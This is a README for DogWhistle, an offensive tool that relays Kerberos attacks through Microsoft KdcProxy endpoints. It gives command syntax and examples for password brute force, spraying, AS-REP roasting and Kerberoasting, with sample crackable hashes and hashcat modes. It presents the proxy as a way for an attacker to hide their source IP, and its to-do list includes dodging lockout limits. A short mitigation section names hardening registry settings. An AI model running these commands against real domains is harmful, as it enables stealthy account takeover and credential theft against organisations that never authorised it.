## DogWhistle

DogWhistle is a tool that can interact with Microsoft KdcProxy ([KDC Proxy for Remote Access (syfuhs.net)](https://syfuhs.net/kdc-proxy-for-remote-access)) service. KdcProxy are commonly used with the following services to enable external clients on the internet to perform Kerberos requests to internal domain controllers:

- Direct Access (tested)
  - Direct Access exposes the KdcProxy function and it is possible to interact with the service even if client certificate is required by DA
- Remote Desktop Gateway (not tested yet but should be the same service)
- Microsoft also recommends to setup KdcProxy when using SMB over QUIC ([SMB over QUIC | Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-over-quic)). 

Logging gets interesting because the AD authentication logs will have the source IP of the proxy. The only log I found is C:\Windows\System32\LogFiles\HTTPERR which only logs failed requests. So if you as an attacker don't want to expose your own IP performing malicous requests, you can proxy the requests to be stealthy. 

The tool can use the KdcProxy to perform Kerberos attacks such as ASREPRoast and Kerberoast as well as regular bruteforce and password spraying.

### Usage:

```
Ask TGT:           DogWhistle.exe asktgt <kdcproxy> <internal domain> <username> <password>

Bruteforce:        DogWhistle.exe bruteforce <kdcproxy> <internal domain> <username> <path-to-password-file>
                   BEWARE! KdcProxy will lock authentication for about 10 minutes after 11 invalid retries.
                   Internal password policys may lock account sooner!

Password spray:    DogWhistle.exe spray <kdcproxy> <internal domain> <path-to-username-file> <password>

ASREPRoast:        DogWhistle.exe asreproast <kdcproxy> <internal domain> <username-without-pre-auth-req>

Kerberoast:        DogWhistle.exe kerberoast <kdcproxy> <internal domain> <username> <password> <spn>

Scan:              DogWhistle.exe scan <host/ip/range> <port>

Examples:
.\DogWhistle.exe asktgt https://192.0.2.200/KdcProxy pwn.lab administrator P@ssw0rd!
.\DogWhistle.exe scan 192.0.2.1-254 443

This tool does not perform server certificate validation!
```



### Discovery:

The default URL for KdcProxy is https://host/KdcProxy. KdcProxy will send TCP RST if it cannot interpret the request and will also send a TCP RST if it cannot perform a successful lookup for a SRV DNS record for the requested user domain/realm. DogWhistle can try to guess if a KdcProxy is available by sending a fake authentication request by using the scan option. If the server responds with RST instead of HTTP status code, it is probably a KdcProxy.

In addition, KdcProxies can sometimes be found in the following registry key on domain connected machines:

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\KdcProxy\ProxyServers
```

On a server, if KPSSVC is running it has a KdcProxy running. "netsh http show urlacl" can be used to view if KdcProxy is listening on the host.



### ASREPRoast:

```
.\DogWhistle.exe asreproast <kdcproxy> <internal domain> <username-without-pre-auth-req>
```

Run hashcat with -m 18200

Example:

```
.\DogWhistle.exe asreproast https://192.0.2.200/KdcProxy pwn.lab administrator P@ssw0rd!
AS-REP Hash: $krb5asrep$23$nopa@pwn.lab:3117D05440A84783CC9983F054F2D7DA$5D678E0E0AE4D8ABE850F7E6E67417BE3D54CA842ABA75303E2B1D8EB21BF38C97F78E65E2AF80498759DA0D4B9D91B95B5F93A225B20842265F88BE28BA52E37F517B21705535821760D5A19965B50AFDB8CB0FE1E3C2CE5B0773E483D0A7F73DBD42524E940E46B62FB2F82E185BB583C470D0B741DDDBCED66E1AECC17C88FD505160E0332CBFF5125181CFC8B7633564911C000782558FAAB8F2A1B9927B6E71A1457D3C9B690AC9847392CCBE6863409B73E6DDE2C4096E3DA7640E49773E2634F61F8857173F4D12EE0844FCA8C17D2B76DC2F20354F2DDE44469DFD41533E4DD6D82FE820D306DAB88FB28964785FD3589E18
```



### Kerberoast:

Requires valid domain username and password. Kerberoastble accounts are usually gathered via LDAP, so the output shows account unknown for now.

```
.\DogWhistle.exe kerberoast <kdcproxy> <internal domain> <username> <password> <spn>
```

Run hashcat with -m 13100

Example:

```
.\DogWhistle.exe kerberoast https://da.pwn.com/KdcProxy pwn.lab administrator@pwn.lab P@ssw0rd! MSSQLSvc/sqlsrv.pwn.lab:1433
TGS-REP hash: $krb5tgs$23$*unknown$PWN.LAB$MSSQLSvc/sqlsrv.pwn.lab:1433*$BF5365B9EB1ABBA325DAF0D059A72FCB$992AEA945160352E94BC61178B3380391B5F64D97EE0DD4D2ABE18A147DE8D2ADA692858A11F44BB21FFECB5BCE11D357652CA5A1D8EC52C7D3C15760B2A5660B7EC3C2DDB8FBD1115D22726911BCA832D0F76A90898168A978BF5BA40E4F0D7380660867804EF9F8A2E4485FA05ED2891141FD171D03EFF5065CAC711AE56390D9EE58FF5806695AD65E00A6B75A87F513A4FD7428E406DA22A387E26C5925C650130E9B801763B00C72C27F603AE9C36516CC03F2FEB5342882D442363F70AC0DF1746425B9BF806129AAC1AD907E5AF42CFD916E877D39645ED5291D3C8A4FEDC2AFC34812997448D4143137565BAA117E01C2EC1FBC8E3952294755AC53785BFFDB2025D025942D4D0E322CC135C84B76B6B561C28BB1C0861A088C638009D49718A39BCEFB5424BD5D69E57E9D3C01B6212C2097DB0435DB363B06BC3FAFB69E89CF7BF37D46E6FE03057B07BC8E43839060B14D12CC5266951C416F08F3FE5B76294CD20629CFF28CBB6F04F1824D59BCE10421542CF93F5714FD7CBACE126F963FD5743BB069F465D01429E5E17BD4FA8E42124CC8484094053DA319299EA60D50BC7967B4599430DCDDECC8E42E9E8C0B7EB4821812BD8555CD501F45F5F7746E53B0D94EEFDA8E1462F41D0AFFE82DC434B9879385EAC7E70F48580A8B404683AB4FFE58DBF2B173BA6689D09D9EC3185F9BFC2178458E31BD2E01FF1A4E03F843F57BAE02063A18D18DEC8E3798F0505E6EA6B6A930EE637F3E89C3806F9FDB7772D0C75DA6AAD0FE1FD0A8C64B0C6BFA44D4B817E6DD7982AAC3ACF90F5D29E921A6BCCC9F88BF9E519B89AC8C5307F28B174F867470F73D4259E53C5FD0F1F7E18E2ADEC39BB96972A7E5D9E5E6FCD56AE960E49D914890E52BFFEA75B425FC6EFC19610E5808E7A584D94032DD0E60C80172E64987323E2D5303C4C5DE6615230604BEA5AF16FCF42D42EAE85E1EBE22C77C444ECB6460877CAE4E28D572DF12AF0D3EA234C1BA8AADD6FC4494772FFBD98DFB29928AD9E9EB9B1BCF390BF9CDC2F8F8E68B56DBC2FDE0F5D3D84389F0A3FD932098ADE9017E4EAF2C0DB194246B5F92DC1D42FAB227D28BADD8C25EB8ED35CC306112BF2B67AEA08F8B947C32954BA8466DF5D5073431293BC430E57B8726140DBC619CF2ED2BBD01BABDE3F1D37D948CBC98733AA3BE116040A82374EC2A0BB12000F9826D8191D1124AA574720B2EF47B5FA1C81437D7AF4A04E9B48B1175CA428B42644BC7EFA7C3F7205C75FF7295DE30C
```



### Mitigation 

There are two settings in the following registry path:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KPSSVC\Settings

DisallowUnprotectedPasswordAuth - Requires Flexible Authentication Secure Tunneling (FAST)

HttpsClientAuth - Require client TLS certificate
```

Note that these settings may affect the services using the KdcProxy.

Even Microsoft disables these protection mechanisms:

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\KPSSVC\Settings" /v HttpsClientAuth /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\KPSSVC\Settings" /v DisallowUnprotectedPasswordAuth /t REG_DWORD /d 0x0 /f
```

https://github.com/MicrosoftDocs/windowsserverdocs/blob/main/WindowsServerDocs/storage/file-server/smb-over-quic.md



### TODO

- Figure out KdcProxy bruteforce lockout and implement timer so it doesn't trigger
- Brute force mode for ASREPRoast and Kerberoast SPN
- Better detection with DNS integration (Like burp collaborator)
- Dig into Flexible Authentication Secure Tunneling (FAST)
- Add other ETypes than RC4
- Better command line handling



### Credits

Inspired by Rubeus - https://github.com/GhostPack/Rubeus

Uses the fabulous Kerberos.NET library - https://github.com/dotnet/Kerberos.NET

